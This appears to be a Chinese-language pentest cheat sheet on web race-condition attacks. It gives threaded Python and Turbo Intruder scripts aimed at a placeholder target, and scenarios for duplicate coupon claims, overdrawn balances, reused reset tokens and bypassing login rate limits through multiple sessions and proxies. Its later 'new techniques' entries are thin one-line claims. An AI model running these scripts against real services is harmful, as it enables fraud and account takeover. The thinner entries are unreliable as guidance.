# 竞态条件 (Race Conditions)

## 原理

应用程序在处理并发请求时未做充分同步，攻击者通过同时发送多个请求，利用时间窗口实现重复领取、余额超支、绕过限制等。

## 攻击链

### 1. 识别竞态点

```http
# 常见场景
- 优惠券领取（每个用户限领一次）
- 抽奖（每个用户限抽一次）
- 余额扣减（提现、转账）
- 库存扣减（秒杀）
- 投票（每个用户限投一次）
- 邮箱验证（验证码可重复使用）
- 密码重置（token 可重复使用）
```

### 2. 基础攻击

```python
# Python 并发请求
import requests
import threading

URL = "http://target.com/api/coupon"
DATA = {"code": "DISCOUNT10"}
COOKIES = {"session": "user_session"}

def claim():
    r = requests.post(URL, data=DATA, cookies=COOKIES)
    print(r.text)

threads = []
for _ in range(20):
    t = threading.Thread(target=claim)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

### 3. Turbo Intruder (Burp)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           engine=Engine.BURP2
                           )
    
    for i in range(20):
        engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

### 4. 单数据包攻击 (Single-Packet Attack)

```python
# PortSwigger 2023 年提出
# 将多个请求打包在一个 TCP 包中发送
# 确保服务器同时处理

# 使用 HTTP/2
# 多路复用，多个流同时发送

# Turbo Intruder 支持
engine = RequestEngine(endpoint=target.endpoint,
                       concurrentConnections=1,
                       engine=Engine.HTTP2
                       )
for i in range(20):
    engine.queue(target.req)
engine.start(timeout=5)
```

### 5. 最后一个字节同步

```python
# 不完整请求
# 先发送除最后一个字节外的所有数据
# 然后同时发送所有请求的最后一个字节

# Turbo Intruder
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           engine=Engine.BURP2
                           )
    
    # 先发送不完整请求
    for i in range(20):
        engine.queue(target.req, marker='last-byte')
    
    # 同时发送最后一个字节
    engine.completeRequests()
```

## 利用场景

### 1. 重复领取

```python
# 优惠券
POST /api/coupon/claim
{"code": "DISCOUNT10"}

# 并发发送 20 个请求
# 如果服务器先检查再发放，可能多次发放
```

### 2. 余额超支

```python
# 转账
POST /api/transfer
{"to": "attacker", "amount": 100}

# 余额 100，转账 100
# 并发发送 20 个请求
# 如果先查余额再扣款，可能扣款超过余额
```

### 3. 绕过限制

```python
# 投票
POST /api/vote
{"candidate": 1}

# 每个用户限投一次
# 并发发送，可能多次投票
```

### 4. 密码重置

```python
# 密码重置
POST /api/reset_password
{"token": "abc123", "new_password": "new"}

# token 使用后失效
# 并发发送，可能多次使用
```

### 5. 邮箱验证

```python
# 邮箱验证
POST /api/verify_email
{"code": "123456"}

# 验证码使用后失效
# 并发发送，可能多次验证
```

### 6. 限流绕过

```python
# 登录
POST /api/login
{"username": "admin", "password": "pass"}

# 限流：每分钟 5 次
# 并发发送，可能突破限流
```

## 各语言竞态条件

### PHP

```php
# 文件写入竞态
file_put_contents('counter.txt', file_get_contents('counter.txt') + 1);
# 并发时可能丢失更新

# 数据库竞态
# 没有使用事务或锁
```

### Python

```python
# Django
# 没有使用 select_for_update
User.objects.filter(id=1).update(balance=F('balance') - 100)

# Flask
# 没有使用锁
```

### Java

```java
// 没有使用 synchronized
// 没有使用数据库锁
```

### Node.js

```javascript
// 单线程但异步
// 没有使用原子操作
```

## 绕过技巧

### 1. 多会话

```python
# 使用多个会话
# 每个会话发送一个请求
sessions = [login() for _ in range(20)]
for s in sessions:
    threading.Thread(target=claim, args=(s,)).start()
```

### 2. 多 IP

```python
# 使用代理
proxies = [
    {"http": "socks5://proxy1:1080"},
    {"http": "socks5://proxy2:1080"},
    # ...
]
```

### 3. 多端点

```python
# 同一操作有多个端点
endpoints = [
    "/api/coupon/claim",
    "/api/v2/coupon/claim",
    "/api/coupon/redeem",
]
```

### 4. 时序控制

```python
# 精确控制请求时序
# 使用 barrier
import threading

barrier = threading.Barrier(20)

def claim():
    barrier.wait()  # 等待所有线程就绪
    requests.post(URL, data=DATA, cookies=COOKIES)

threads = [threading.Thread(target=claim) for _ in range(20)]
for t in threads:
    t.start()
for t in threads:
    t.join()
```

## 2024-2026 新技术点

### 1. 单数据包攻击 (Single-Packet Attack)

```python
# PortSwigger 2023 年提出
# HTTP/2 多路复用
# 将多个请求打包在一个 TCP 包中
# 解决网络抖动问题

# Turbo Intruder 支持
# 使用 HTTP/2 引擎
```

### 2. HTTP/2 竞态

```python
# HTTP/2 多路复用
# 多个流同时发送
# 服务器同时处理
```

### 3. HTTP/3 竞态

```python
# HTTP/3 基于 QUIC
# 0-RTT 连接
# 新的竞态场景
```

### 4. WebSocket 竞态

```javascript
// WebSocket 全双工通信
// 通过 WebSocket 发送并发消息
```

### 5. Server-Sent Events 竞态

```python
# 通过 SSE 推送
# 触发服务器端竞态
```

### 6. 数据库新特性

```sql
# PostgreSQL 15+ MERGE 语句
# 可能存在竞态

# MySQL 8.0+ SKIP LOCKED
# 绕过锁
```

### 7. 缓存竞态

```python
# Redis 缓存竞态
# 通过 GET + SET 触发
# 使用 SETNX 解决
```

### 8. 微服务竞态

```python
# 分布式系统竞态
# 通过消息队列触发
# 通过事件驱动触发
```

### 9. Serverless 竞态

```python
# AWS Lambda 冷启动
# 多个 Lambda 实例并发
# 共享状态竞态
```

### 10. AI 应用竞态

```python
# LLM 应用中的竞态
# 通过 prompt injection 触发
# 通过工具调用并发
```

## 工具推荐

- **Turbo Intruder** (Burp 插件) — 竞态攻击神器
- **Burp Suite Repeater** — 手动测试
- **Burp Suite Intruder** — 并发请求
- **w8race** — 竞态条件工具
- **race-the-web** — 竞态条件工具

## 参考链接

- [PortSwigger Race Conditions](https://portswigger.net/web-security/race-conditions)
- [Single-Packet Attack](https://portswigger.net/research/smashing-the-state-machine)
- [PayloadsAllTheThings - Race Condition](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Race%20Condition)
